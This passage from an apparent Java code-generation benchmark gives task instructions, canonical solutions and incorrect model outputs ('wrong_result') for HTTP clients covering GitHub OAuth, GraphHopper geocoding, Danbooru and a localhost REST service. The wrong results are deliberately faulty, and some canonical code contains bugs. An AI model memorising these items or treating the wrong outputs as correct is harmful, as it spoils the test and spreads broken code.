    "Canonical_solution": "import java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.MappedByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\n\npublic class FileChannelProcessor {\n    private static final int MAX_LINE_LENGTH = 128;\n    private static final int MMAP_CHUNK_SIZE = Integer.MAX_VALUE / 32;\n\n    private FileChannel fileChannel;\n    private Path filePath;\n\n    public FileChannelProcessor(Path filePath) {\n        this.filePath = filePath;\n    }\n\n    public void openChannel() throws IOException {\n        this.fileChannel = FileChannel.open(filePath, StandardOpenOption.READ);\n    }\n\n    public MappedByteBuffer mapFileSegment(long start, long size) throws IOException {\n        return fileChannel.map(FileChannel.MapMode.READ_ONLY, start, size);\n    }\n\n    public ByteBuffer readBufferSegment(long position, int length) throws IOException {\n        ByteBuffer buf = ByteBuffer.allocateDirect(length);\n        fileChannel.read(buf, position);\n        return buf;\n    }\n\n    public long findLineBoundary(ByteBuffer buffer, long startPosition) {\n        int w = MAX_LINE_LENGTH;\n        while (buffer.get(w - 1) != '\\n') {\n            w--;\n        }\n        return startPosition + w;\n    }\n\n    public void closeChannel() throws IOException {\n        if (fileChannel != null) {\n            fileChannel.close();\n        }\n    }\n\n    public long getFileSize() throws IOException {\n        return fileChannel.size();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "public class FileChannelProcessor {\n    private FileChannel fileChannel;\n    private Path filePath;\n    public static final int MAX_LINE_LENGTH = 1024;\n    public static final int MMAP_CHUNK_SIZE = 1024 * 1024;\n\n    public void openChannel() throws IOException {\n        fileChannel = FileChannel.open(filePath, StandardOpenOption.READ);\n    }\n\n    public MappedByteBuffer mapFileSegment(long start, long size) throws IOException {\n        return fileChannel.map(FileChannel.MapMode.READ_ONLY, start, size);\n    }\n\n    public ByteBuffer readBufferSegment(long position, int length) throws IOException {\n        ByteBuffer buffer = ByteBuffer.allocateDirect(length);\n        fileChannel.read(buffer, position);\n        buffer.flip();\n        return buffer;\n    }\n\n    public long findLineBoundary(ByteBuffer buffer, long startPosition) {\n        long endPosition = Math.min(startPosition + MAX_LINE_LENGTH, buffer.limit());\n        for (long i = startPosition; i < endPosition; i++) {\n            if (buffer.get((int) i) == '\\n') {\n                return i;\n            }\n        }\n        return -1;\n    }\n\n    public void closeChannel() throws IOException {\n        if (fileChannel != null && fileChannel.isOpen()) {\n            fileChannel.close();\n        }\n    }\n\n    public long getFileSize() throws IOException {\n        return Files.size(filePath);\n    }\n}"
  },
  {
    "Task_id": 240,
    "Instruction": "Task Description: Implement a Java class that interacts with GitHub's OAuth API to obtain an access token and retrieve user information using the OkHttp library for HTTP requests.\n\nClass Description: The `GithubProvider` class handles authentication with GitHub's OAuth API. It provides methods to obtain an access token using authorization code and to fetch GitHub user information using the obtained access token.\n\nAttributes:\n- clientId: String - GitHub OAuth application client ID (injected from configuration)\n- clientSecret: String - GitHub OAuth application client secret (injected from configuration)\n- redirectUri: String - Redirect URI registered with GitHub OAuth application (injected from configuration)\n\nMethods:\n- getAccessToken(AccessTokenDTO accessTokenDTO) -> String - Obtains an access token from GitHub's OAuth API. Takes an AccessTokenDTO object containing authorization code and other parameters, sets client credentials, makes a POST request to GitHub's token endpoint, and returns the access token.\n- getUser(String accessToken) -> GithubUser - Retrieves GitHub user information using the provided access token. Makes a GET request to GitHub's user API endpoint with the access token in the Authorization header and returns the user data as a GithubUser object.",
    "Canonical_solution": "import com.alibaba.fastjson.JSON;\nimport life.majiang.community.dto.AccessTokenDTO;\nimport life.majiang.community.provider.dto.GithubUser;\nimport okhttp3.*;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\n\n@Component\npublic class GithubProvider {\n\n    @Value(\"${github.client.id}\")\n    private String clientId;\n\n    @Value(\"${github.client.secret}\")\n    private String clientSecret;\n\n    @Value(\"${github.redirect.uri}\")\n    private String redirectUri;\n\n    public String getAccessToken(AccessTokenDTO accessTokenDTO) {\n        accessTokenDTO.setClient_id(clientId);\n        accessTokenDTO.setClient_secret(clientSecret);\n        accessTokenDTO.setRedirect_uri(redirectUri);\n        MediaType mediaType = MediaType.get(\"application/json; charset=utf-8\");\n        OkHttpClient client = new OkHttpClient();\n\n        RequestBody body = RequestBody.create(mediaType, JSON.toJSONString(accessTokenDTO));\n        Request request = new Request.Builder()\n                .url(\"https://github.com/login/oauth/access_token\")\n                .post(body)\n                .build();\n        try (Response response = client.newCall(request).execute()) {\n            String string = response.body().string();\n            String token = string.split(\"&\")[0].split(\"=\")[1];\n            return token;\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        return null;\n    }\n\n    public GithubUser getUser(String accessToken) {\n        OkHttpClient client = new OkHttpClient();\n        Request request = new Request.Builder()\n                .url(\"https://api.github.com/user\")\n                .header(\"Authorization\", \"token \" + accessToken)\n                .build();\n        try {\n            Response response = client.newCall(request).execute();\n            String string = response.body().string();\n            GithubUser githubUser = JSON.parseObject(string, GithubUser.class);\n            return githubUser;\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        return null;\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 22,
    "wrong_result": "```java\nimport okhttp3.*;\n\nimport java.io.IOException;\n\npublic class GithubProvider {\n    private final String clientId;\n    private final String clientSecret;\n    private final String redirectUri;\n\n    public GithubProvider(String clientId, String clientSecret, String redirectUri) {\n        this.clientId = clientId;\n        this.clientSecret = clientSecret;\n        this.redirectUri = redirectUri;\n    }\n\n    public String getAccessToken(AccessTokenDTO accessTokenDTO) throws IOException {\n        OkHttpClient client = new OkHttpClient();\n\n        FormBody.Builder formBuilder = new FormBody.Builder();\n        formBuilder.add(\"client_id\", clientId);\n        formBuilder.add(\"client_secret\", clientSecret);\n        formBuilder.add(\"code\", accessTokenDTO.getAuthorizationCode());\n        formBuilder.add(\"redirect_uri\", redirectUri);\n\n        Request request = new Request.Builder()\n                .url(\"https://github.com/login/oauth/access_token\")\n                .post(formBuilder.build())\n                .addHeader(\"Accept\", \"application/json\")\n                .build();\n\n        try (Response response = client.newCall(request).execute()) {\n            if (!response.isSuccessful()) throw new IOException(\"Unexpected code \" + response);\n\n            String responseBody = response.body().string();\n            return parseAccessToken(responseBody);\n        }\n    }\n\n    private String parseAccessToken(String response) {\n        int start = response.indexOf(\"\\\"access_token\\\":\\\"\") + 16;\n        int end = response.indexOf(\"\\\"\", start);\n        return response.substring(start, end);\n    }\n\n    public GithubUser getUser(String accessToken) throws IOException {\n        OkHttpClient client = new OkHttpClient();\n\n        Request request = new Request.Builder()\n                .url(\"https://api.github.com/user\")\n                .addHeader(\"Authorization\", \"token \" + accessToken)\n                .addHeader(\"Accept\", \"application/json\")\n                .build();\n\n        try (Response response = client.newCall(request).execute()) {\n            if (!response.isSuccessful()) throw new IOException(\"Unexpected code \" + response);\n\n            String responseBody = response.body().string();\n            return parseGithubUser(responseBody);\n        }\n    }\n\n    private GithubUser parseGithubUser(String response) {\n        // Simplified parsing; in a real scenario, consider using a JSON library like Jackson or Gson\n        int loginStart = response.indexOf(\"\\\"login\\\":\\\"\") + 10;\n        int loginEnd = response.indexOf(\"\\\"\", loginStart);\n        String login = response.substring(loginStart, loginEnd);\n\n        int idStart = response.indexOf(\"\\\"id\\\":\") + 5;\n        int idEnd = response.indexOf(\",\", idStart);\n        int id = Integer.parseInt(response.substring(idStart, idEnd));\n\n        return new GithubUser(login, id);\n    }\n\n    public static class AccessTokenDTO {\n        private String authorizationCode;\n\n        public AccessTokenDTO(String authorizationCode) {\n            this.authorizationCode = authorizationCode;\n        }\n\n        public String getAuthorizationCode() {\n            return authorizationCode;\n        }\n    }\n\n    public static class GithubUser {\n        private String login;\n        private int id;\n\n        public GithubUser(String login, int id) {\n            this.login = login;\n            this.id = id;\n        }\n\n        public String getLogin() {\n            return login;\n        }\n\n        public int getId() {\n            return id;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 241,
    "Instruction": "Task Description: Create a Java class that implements a RESTful API client for inter-process communication using HTTP, with support for handling both client and server errors, and token-based authentication.\n\nClass Description: The BeaconClient class is a RESTful HTTP client designed for inter-process communication. It handles HTTP requests and responses, manages authentication tokens, and provides error handling for both client-side (4xx) and server-side (5xx) errors. The class uses Java's HttpClient for communication and Jackson for JSON serialization/deserialization.\n\nAttributes:\n- port: int - The port number on which the server is running (localhost)\n- token: String - The authentication token used for Bearer token authorization (optional)\n\nMethods:\n- performRequest: <RES> performRequest(BeaconInterface<?> prov, String rawNode) -> RES - Sends an HTTP POST request to the specified path with the given content. Handles authentication and error responses. Returns the deserialized response object.\n- performRequest: <REQ, RES> performRequest(REQ req) -> RES - Converts the request object to JSON and sends it to the appropriate endpoint determined by the request type. Returns the deserialized response object.\n- parseClientError: Optional<BeaconClientErrorResponse> parseClientError(HttpResponse<String> response) -> Optional<BeaconClientErrorResponse> - Parses and returns client error responses (4xx status codes) from the server.\n- parseServerError: Optional<BeaconServerErrorResponse> parseServerError(HttpResponse<String> response) -> Optional<BeaconServerErrorResponse> - Parses and returns server error responses (5xx status codes) from the server.",
    "Canonical_solution": "import io.xpipe.beacon.api.HandshakeExchange;\nimport io.xpipe.core.util.JacksonMapper;\nimport com.fasterxml.jackson.databind.node.ObjectNode;\nimport java.io.IOException;\nimport java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.nio.file.Files;\nimport java.util.Optional;\n\npublic class BeaconClient {\n\n    private final int port;\n    private String token;\n\n    public BeaconClient(int port) {\n        this.port = port;\n    }\n\n    public <RES> RES performRequest(BeaconInterface<?> prov, String rawNode)\n            throws BeaconConnectorException, BeaconClientException, BeaconServerException {\n        var client = HttpClient.newHttpClient();\n        HttpResponse<String> response;\n        try {\n            var uri = URI.create(\"http://127.0.0.1:\" + port + prov.getPath());\n            var builder = HttpRequest.newBuilder();\n            if (token != null) {\n                builder.header(\"Authorization\", \"Bearer \" + token);\n            }\n            var httpRequest = builder.uri(uri)\n                    .POST(HttpRequest.BodyPublishers.ofString(content))\n                    .build();\n            response = client.send(httpRequest, HttpResponse.BodyHandlers.ofString());\n        } catch (Exception ex) {\n            throw new BeaconConnectorException(\"Couldn't send request\", ex);\n        }\n\n        var se = parseServerError(response);\n        if (se.isPresent()) {\n            se.get().throwError();\n        }\n\n        var ce = parseClientError(response);\n        if (ce.isPresent()) {\n            throw ce.get().throwException();\n        }\n\n        try {\n            var reader = JacksonMapper.getDefault().readerFor(prov.getResponseClass());\n            var emptyResponseClass = prov.getResponseClass().getDeclaredFields().length == 0;\n            var body = response.body();\n            if (emptyResponseClass && body.isBlank()) {\n                return createDefaultResponse(prov);\n            }\n            var v = (RES) reader.readValue(body);\n            return v;\n        } catch (IOException ex) {\n            throw new BeaconConnectorException(\"Couldn't parse response\", ex);\n        }\n    }\n\n    public <REQ, RES> RES performRequest(REQ req)\n            throws BeaconConnectorException, BeaconClientException, BeaconServerException {\n        ObjectNode node = JacksonMapper.getDefault().valueToTree(req);\n        var prov = BeaconInterface.byRequest(req);\n        if (prov.isEmpty()) {\n            throw new IllegalArgumentException(\"Unknown request class \" + req.getClass());\n        }\n        return performRequest(prov.get(), node.toPrettyString());\n    }\n\n    private Optional<BeaconClientErrorResponse> parseClientError(HttpResponse<String> response)\n            throws BeaconConnectorException {\n        if (response.statusCode() < 400 || response.statusCode() > 499) {\n            return Optional.empty();\n        }\n        try {\n            var v = JacksonMapper.getDefault().readValue(response.body(), BeaconClientErrorResponse.class);\n            return Optional.of(v);\n        } catch (IOException ex) {\n            throw new BeaconConnectorException(\"Couldn't parse client error message\", ex);\n        }\n    }\n\n    private Optional<BeaconServerErrorResponse> parseServerError(HttpResponse<String> response)\n            throws BeaconConnectorException {\n        if (response.statusCode() < 500 || response.statusCode() > 599) {\n            return Optional.empty();\n        }\n        try {\n            var v = JacksonMapper.getDefault().readValue(response.body(), BeaconServerErrorResponse.class);\n            return Optional.of(v);\n        } catch (IOException ex) {\n            throw new BeaconConnectorException(\"Couldn't parse client error message\", ex);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 22,
    "wrong_result": "public class BeaconClient {\n    private final int port;\n    private String token;\n\n    public BeaconClient(int port) {\n        this.port = port;\n    }\n\n    public <RES> RES performRequest(BeaconInterface<?> prov, String rawNode) throws Exception {\n        String url = \"http://localhost:\" + port + \"/\" + rawNode;\n        String json = prov.serialize();\n        HttpClient client = HttpClient.newHttpClient();\n        HttpRequest request = HttpRequest.newBuilder()\n                .uri(java.net.URI.create(url))\n                .header(\"Content-Type\", \"application/json\")\n                .header(\"Authorization\", \"Bearer \" + token)\n                .POST(HttpRequest.BodyPublishers.ofString(json))\n                .build();\n\n        HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());\n\n        if (response.statusCode() >= 400 && response.statusCode() < 500) {\n            Optional<BeaconClientErrorResponse> error = parseClientError(response);\n            throw new RuntimeException(\"Client error: \" + error.map(e -> e.getMessage()).orElse(\"Unknown client error\"));\n        } else if (response.statusCode() >= 500) {\n            Optional<BeaconServerErrorResponse> error = parseServerError(response);\n            throw new RuntimeException(\"Server error: \" + error.map(e -> e.getMessage()).orElse(\"Unknown server error\"));\n        }\n\n        return prov.deserialize(response.body());\n    }\n\n    public <REQ, RES> RES performRequest(REQ req) throws Exception {\n        String url = \"http://localhost:\" + port + \"/api\";\n        String json = new com.fasterxml.jackson.databind.ObjectMapper().writeValueAsString(req);\n        HttpClient client = HttpClient.newHttpClient();\n        HttpRequest request = HttpRequest.newBuilder()\n                .uri(java.net.URI.create(url))\n                .header(\"Content-Type\", \"application/json\")\n                .header(\"Authorization\", \"Bearer \" + token)\n                .POST(HttpRequest.BodyPublishers.ofString(json))\n                .build();\n\n        HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());\n\n        if (response.statusCode() >= 400 && response.statusCode() < 500) {\n            Optional<BeaconClientErrorResponse> error = parseClientError(response);\n            throw new RuntimeException(\"Client error: \" + error.map(e -> e.getMessage()).orElse(\"Unknown client error\"));\n        } else if (response.statusCode() >= 500) {\n            Optional<BeaconServerErrorResponse> error = parseServerError(response);\n            throw new RuntimeException(\"Server error: \" + error.map(e -> e.getMessage()).orElse(\"Unknown server error\"));\n        }\n\n        return new com.fasterxml.jackson.databind.ObjectMapper().readValue(response.body(), (Class<RES>) ((java.lang.reflect.ParameterizedType) getClass().getDeclaredField(\"performRequest\").getGenericType()).getActualTypeArguments()[1]);\n    }\n\n    public Optional<BeaconClientErrorResponse> parseClientError(HttpResponse<String> response) {\n        try {\n            if (response.statusCode() >= 400 && response.statusCode() < 500) {\n                return Optional.of(new com.fasterxml.jackson.databind.ObjectMapper().readValue(response.body(), BeaconClientErrorResponse.class));\n            }\n        } catch (Exception e) {\n            return Optional.empty();\n        }\n        return Optional.empty();\n    }\n\n    public Optional<BeaconServerErrorResponse> parseServerError(HttpResponse<String> response) {\n        try {\n            if (response.statusCode() >= 500) {\n                return Optional.of(new com.fasterxml.jackson.databind.ObjectMapper().readValue(response.body(), BeaconServerErrorResponse.class));\n            }\n        } catch (Exception e) {\n            return Optional.empty();\n        }\n        return Optional.empty();\n    }\n\n    public void setToken(String token) {\n        this.token = token;\n    }\n}"
  },
  {
    "Task_id": 242,
    "Instruction": "Task Description: Create a Java class that implements geocoding functionality using the GraphHopper API, allowing both forward and reverse geocoding operations through HTTP requests.\n\nClass Description: The GraphHopperGeocoding class provides methods to perform geocoding operations by communicating with the GraphHopper API service. It handles HTTP client configuration, request building, response processing, and error handling.\n\nAttributes:\n- objectMapper: ObjectMapper - Used for JSON serialization/deserialization\n- downloader: OkHttpClient - HTTP client for making requests\n- routeServiceUrl: String - Base URL for the GraphHopper geocoding API\n- key: String - API key for authentication\n- DEFAULT_TIMEOUT: long - Default timeout value for HTTP requests (5000ms)\n\nMethods:\n- GraphHopperGeocoding() -> Constructor - Initializes with default GraphHopper API URL\n- GraphHopperGeocoding(String serviceUrl) -> Constructor - Initializes with custom service URL\n- geocode(GHGeocodingRequest request) -> GHGeocodingResponse - Performs geocoding operation based on request parameters\n- setDownloader(OkHttpClient downloader) -> GraphHopperGeocoding - Sets custom HTTP client\n- setKey(String key) -> void - Sets API key for authentication\n- getDownloader() -> OkHttpClient - Returns current HTTP client instance\n- getClientForRequest(GHGeocodingRequest request) -> OkHttpClient - Returns configured HTTP client with appropriate timeout\n- buildUrl(GHGeocodingRequest request) -> String - Constructs API request URL with proper parameters\n- encodeURL(String str) -> String - URL-encodes string parameters (private helper method)",
    "Canonical_solution": "import com.fasterxml.jackson.databind.ObjectMapper;\nimport com.graphhopper.api.model.GHGeocodingRequest;\nimport com.graphhopper.api.model.GHGeocodingResponse;\nimport okhttp3.OkHttpClient;\nimport okhttp3.Request;\nimport okhttp3.Response;\nimport okhttp3.ResponseBody;\n\nimport java.io.IOException;\nimport java.io.UnsupportedEncodingException;\nimport java.net.URLEncoder;\nimport java.util.concurrent.TimeUnit;\n\nimport static com.graphhopper.api.GraphHopperWeb.X_GH_CLIENT_VERSION;\nimport static com.graphhopper.api.Version.GH_VERSION_FROM_MAVEN;\n\npublic class GraphHopperGeocoding {\n\n    private final ObjectMapper objectMapper;\n    private OkHttpClient downloader;\n    private String routeServiceUrl;\n    private String key = \"\";\n    private final long DEFAULT_TIMEOUT = 5000;\n\n    public GraphHopperGeocoding() {\n        this(\"https://graphhopper.com/api/1/geocode\");\n    }\n\n    public GraphHopperGeocoding(String serviceUrl) {\n        this.routeServiceUrl = serviceUrl;\n        downloader = new OkHttpClient.Builder().\n                connectTimeout(DEFAULT_TIMEOUT, TimeUnit.MILLISECONDS).\n                readTimeout(DEFAULT_TIMEOUT, TimeUnit.MILLISECONDS).\n                build();\n        objectMapper = new ObjectMapper();\n    }\n\n    public GHGeocodingResponse geocode(GHGeocodingRequest request) {\n        String url = buildUrl(request);\n        try {\n            Request okRequest = new Request.Builder().url(url)\n                    .header(X_GH_CLIENT_VERSION, GH_VERSION_FROM_MAVEN)\n                    .build();\n            Response rsp = getClientForRequest(request).newCall(okRequest).execute();\n            ResponseBody rspBody = rsp.body();\n            if (!rsp.isSuccessful())\n                throw new RuntimeException(rspBody.string());\n            GHGeocodingResponse geoRsp = objectMapper.readValue(rspBody.bytes(), GHGeocodingResponse.class);\n            return geoRsp;\n        } catch (IOException ex) {\n            throw new RuntimeException(\"IO problem for geocoding URL \" + url + \": \" + ex.getMessage(), ex);\n        }\n    }\n\n    public GraphHopperGeocoding setDownloader(OkHttpClient downloader) {\n        this.downloader = downloader;\n        return this;\n    }\n\n    public void setKey(String key) {\n        this.key = key;\n    }\n\n    public OkHttpClient getDownloader() {\n        return downloader;\n    }\n\n    private OkHttpClient getClientForRequest(GHGeocodingRequest request) {\n        OkHttpClient client = this.downloader;\n        if (request.hasTimeout()) {\n            long timeout = request.getTimeout();\n            client = client.newBuilder()\n                    .connectTimeout(timeout, TimeUnit.MILLISECONDS)\n                    .readTimeout(timeout, TimeUnit.MILLISECONDS)\n                    .build();\n        }\n        return client;\n    }\n\n    private String buildUrl(GHGeocodingRequest request) {\n        String url = routeServiceUrl + \"?\";\n        if (request.isReverse()) {\n            if (!request.getPoint().isValid())\n                throw new IllegalArgumentException(\"For reverse geocoding you have to pass valid lat and long values\");\n            url += \"reverse=true\";\n        } else {\n            if (request.getQuery() == null)\n                throw new IllegalArgumentException(\"For forward geocoding you have to a string for the query\");\n            url += \"reverse=false\";\n            url += \"&q=\" + encodeURL(request.getQuery());\n        }\n\n        if (request.getPoint().isValid())\n            url += \"&point=\" + request.getPoint().getLat() + \",\" + request.getPoint().getLon();\n\n        url += \"&limit=\" + request.getLimit();\n        url += \"&locale=\" + encodeURL(request.getLocale());\n        url += \"&provider=\" + encodeURL(request.getProvider());\n\n        if (!key.isEmpty()) {\n            url += \"&key=\" + encodeURL(key);\n        }\n        return url;\n    }\n\n    private static String encodeURL(String str) {\n        try {\n            return URLEncoder.encode(str, \"UTF-8\");\n        } catch (UnsupportedEncodingException e) {\n            throw new RuntimeException(e);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 22,
    "wrong_result": "{\n  \"className\": \"GraphHopperGeocoding\",\n  \"attributes\": [\n    {\n      \"name\": \"objectMapper\",\n      \"type\": \"ObjectMapper\"\n    },\n    {\n      \"name\": \"downloader\",\n      \"type\": \"OkHttpClient\"\n    },\n    {\n      \"name\": \"routeServiceUrl\",\n      \"type\": \"String\"\n    },\n    {\n      \"name\": \"key\",\n      \"type\": \"String\"\n    },\n    {\n      \"name\": \"DEFAULT_TIMEOUT\",\n      \"type\": \"long\"\n    }\n  ],\n  \"methods\": [\n    {\n      \"name\": \"GraphHopperGeocoding\",\n      \"parameters\": [],\n      \"returnType\": \"void\",\n      \"body\": \"this.routeServiceUrl = \\\"https://graphhopper.com/api/1/geocode\\\";\\n        this.downloader = new OkHttpClient.Builder().connectTimeout(DEFAULT_TIMEOUT, TimeUnit.MILLISECONDS).build();\\n        this.objectMapper = new ObjectMapper();\\n        this.DEFAULT_TIMEOUT = 5000;\"\n    },\n    {\n      \"name\": \"GraphHopperGeocoding\",\n      \"parameters\": [\n        {\n          \"name\": \"serviceUrl\",\n          \"type\": \"String\"\n        }\n      ],\n      \"returnType\": \"void\",\n      \"body\": \"this.routeServiceUrl = serviceUrl;\\n        this.downloader = new OkHttpClient.Builder().connectTimeout(DEFAULT_TIMEOUT, TimeUnit.MILLISECONDS).build();\\n        this.objectMapper = new ObjectMapper();\\n        this.DEFAULT_TIMEOUT = 5000;\"\n    },\n    {\n      \"name\": \"geocode\",\n      \"parameters\": [\n        {\n          \"name\": \"request\",\n          \"type\": \"GHGeocodingRequest\"\n        }\n      ],\n      \"returnType\": \"GHGeocodingResponse\",\n      \"body\": \"String url = buildUrl(request);\\n        Request requestHttp = new Request.Builder().url(url).build();\\n        try (Response response = getClientForRequest(request).newCall(requestHttp).execute()) {\\n            if (!response.isSuccessful()) throw new IOException(\\\"Unexpected code \\\" + response);\\n            return objectMapper.readValue(response.body().string(), GHGeocodingResponse.class);\\n        } catch (IOException e) {\\n            throw new RuntimeException(\\\"Error during geocoding: \\\" + e.getMessage(), e);\\n        }\"\n    },\n    {\n      \"name\": \"setDownloader\",\n      \"parameters\": [\n        {\n          \"name\": \"downloader\",\n          \"type\": \"OkHttpClient\"\n        }\n      ],\n      \"returnType\": \"GraphHopperGeocoding\",\n      \"body\": \"this.downloader = downloader;\\n        return this;\"\n    },\n    {\n      \"name\": \"setKey\",\n      \"parameters\": [\n        {\n          \"name\": \"key\",\n          \"type\": \"String\"\n        }\n      ],\n      \"returnType\": \"void\",\n      \"body\": \"this.key = key;\"\n    },\n    {\n      \"name\": \"getDownloader\",\n      \"parameters\": [],\n      \"returnType\": \"OkHttpClient\",\n      \"body\": \"return downloader;\"\n    },\n    {\n      \"name\": \"getClientForRequest\",\n      \"parameters\": [\n        {\n          \"name\": \"request\",\n          \"type\": \"GHGeocodingRequest\"\n        }\n      ],\n      \"returnType\": \"OkHttpClient\",\n      \"body\": \"return downloader;\"\n    },\n    {\n      \"name\": \"buildUrl\",\n      \"parameters\": [\n        {\n          \"name\": \"request\",\n          \"type\": \"GHGeocodingRequest\"\n        }\n      ],\n      \"returnType\": \"String\",\n      \"body\": \"StringBuilder urlBuilder = new StringBuilder(routeServiceUrl);\\n        urlBuilder.append(\\\"?\\\");\\n        urlBuilder.append(\\\"q=\\\").append(encodeURL(request.getQuery()));\\n        urlBuilder.append(\\\"&format=json\\\");\\n        urlBuilder.append(\\\"&key=\\\").append(key);\\n        return urlBuilder.toString();\"\n    },\n    {\n      \"name\": \"encodeURL\",\n      \"parameters\": [\n        {\n          \"name\": \"str\",\n          \"type\": \"String\"\n        }\n      ],\n      \"returnType\": \"String\",\n      \"body\": \"try {\\n            return URLEncoder.encode(str, \\\"UTF-8\\\");\\n        } catch (UnsupportedEncodingException e) {\\n            throw new RuntimeException(\\\"Encoding error: \\\" + e.getMessage(), e);\\n        }\"\n    }\n  ]\n}"
  },
  {
    "Task_id": 243,
    "Instruction": "Task Description: Create a Java class that interacts with the Danbooru API to fetch and process image posts, including retrieving pages of posts, extracting image URLs, and parsing tags from URLs.\n\nClass Description: The DanbooruApiClient class provides functionality to interact with the Danbooru image board API. It handles HTTP requests to fetch posts, processes JSON responses, and extracts relevant information from URLs.\n\nAttributes:\n- DOMAIN: [String] - The domain name of the Danbooru service\n- client: [OkHttpClient] - HTTP client instance for making requests\n- gidPattern: [Pattern] - Regular expression pattern for parsing tags from URLs\n- currentPageNum: [int] - Tracks the current page number for pagination\n\nMethods:\n- Constructor: DanbooruApiClient() -> [void] - Initializes the HTTP client with timeout settings\n- getPage: [int pageNum] -> [JSONObject] - Fetches a page of posts from Danbooru API with the specified page number, returns posts as JSON object\n- extractUrlsFromJson: [JSONObject json] -> [List<String>] - Extracts image URLs from the JSON response and returns them as a list\n- getTagFromUrl: [URL url] -> [String] - Parses and returns the tag component from a Danbooru URL, throws MalformedURLException if URL format is invalid",
    "Canonical_solution": "import com.rarchives.ripme.utils.Utils;\nimport okhttp3.OkHttpClient;\nimport okhttp3.Request;\nimport okhttp3.Response;\nimport org.json.JSONArray;\nimport org.json.JSONObject;\n\nimport java.io.IOException;\nimport java.net.MalformedURLException;\nimport java.net.URI;\nimport java.net.URISyntaxException;\nimport java.net.URL;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.concurrent.TimeUnit;\nimport java.util.regex.Matcher;\nimport java.util.regex.Pattern;\n\npublic class DanbooruApiClient {\n    private static final String DOMAIN = \"danbooru.donmai.us\";\n    private final OkHttpClient client;\n    private Pattern gidPattern = null;\n    private int currentPageNum = 1;\n\n    public DanbooruApiClient() {\n        this.client = new OkHttpClient.Builder()\n                .readTimeout(60, TimeUnit.SECONDS)\n                .writeTimeout(60, TimeUnit.SECONDS)\n                .build();\n    }\n\n    public JSONObject getPage(int pageNum) throws MalformedURLException {\n        Request request = new Request.Builder()\n                .url(\"https://\" + DOMAIN + \"/posts.json?page=\" + pageNum)\n                .header(\"User-Agent\", \"Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1\")\n                .header(\"Accept\", \"application/json,text/javascript,*/*;q=0.01\")\n                .header(\"Accept-Language\", \"en-US,en;q=0.9\")\n                .header(\"Sec-Fetch-Dest\", \"empty\")\n                .header(\"Sec-Fetch-Mode\", \"cors\")\n                .header(\"Sec-Fetch-Site\", \"same-origin\")\n                .header(\"Referer\", \"https://danbooru.donmai.us/\")\n                .header(\"X-Requested-With\", \"XMLHttpRequest\")\n                .header(\"Connection\", \"keep-alive\")\n                .build();\n\n        try (Response response = client.newCall(request).execute()) {\n            if (!response.isSuccessful()) throw new IOException(\"Unexpected code \" + response);\n\n            String responseData = response.body().string();\n            JSONArray jsonArray = new JSONArray(responseData);\n            if (!jsonArray.isEmpty()) {\n                return new JSONObject(\"{ \\\"resources\\\":\" + jsonArray + \" }\");\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        return null;\n    }\n\n    public List<String> extractUrlsFromJson(JSONObject json) {\n        List<String> res = new ArrayList<>(100);\n        JSONArray jsonArray = json.getJSONArray(\"resources\");\n        for (int i = 0; i < jsonArray.length(); i++) {\n            if (jsonArray.getJSONObject(i).has(\"file_url\")) {\n                res.add(jsonArray.getJSONObject(i).getString(\"file_url\"));\n            }\n        }\n        return res;\n    }\n\n    public String getTagFromUrl(URL url) throws MalformedURLException {\n        gidPattern = Pattern.compile(\"https?://danbooru.donmai.us/(posts)?.*([?&]tags=([^&]*)(?:&z=([0-9]+))?$)\");\n        Matcher m = gidPattern.matcher(url.toExternalForm());\n\n        if (m.matches()) {\n            return m.group(3);\n        }\n\n        throw new MalformedURLException(\"Expected danbooru URL format: \" + DOMAIN + \"/posts?tags=searchterm - got \" + url + \" instead\");\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 22,
    "wrong_result": "public class DanbooruApiClient {\n    private static final String DOMAIN = \"danbooru.donmai.us\";\n    private OkHttpClient client;\n    private Pattern gidPattern;\n    private int currentPageNum;\n\n    public DanbooruApiClient() {\n        this.client = new OkHttpClient.Builder().connectTimeout(30, TimeUnit.SECONDS).build();\n        this.gidPattern = Pattern.compile(\"https://danbooru.donmai.us/posts/\\\\d+/\\\\w+-(\\\\w+)\");\n        this.currentPageNum = 1;\n    }\n\n    public JSONObject getPage(int pageNum) throws IOException {\n        currentPageNum = pageNum;\n        String url = \"https://\" + DOMAIN + \"/posts.json?page=\" + pageNum + \"&limit=20\";\n        Request request = new Request.Builder().url(url).build();\n        Response response = client.newCall(request).execute();\n        if (response.isSuccessful()) {\n            String jsonStr = response.body().string();\n            return new JSONObject(jsonStr);\n        } else {\n            throw new IOException(\"Failed to fetch page: \" + response.code());\n        }\n    }\n\n    public List<String> extractUrlsFromJson(JSONObject json) {\n        List<String> urls = new ArrayList<>();\n        JSONArray posts = json.getJSONArray(\"posts\");\n        for (int i = 0; i < posts.length(); i++) {\n            JSONObject post = posts.getJSONObject(i);\n            String fileUrl = post.getString(\"file_url\");\n            urls.add(fileUrl);\n        }\n        return urls;\n    }\n\n    public String getTagFromUrl(URL url) throws MalformedURLException {\n        Matcher matcher = gidPattern.matcher(url.toString());\n        if (matcher.find()) {\n            return matcher.group(1);\n        } else {\n            throw new MalformedURLException(\"Invalid Danbooru URL format: \" + url.toString());\n        }\n    }\n}"
  },
  {
    "Task_id": 244,
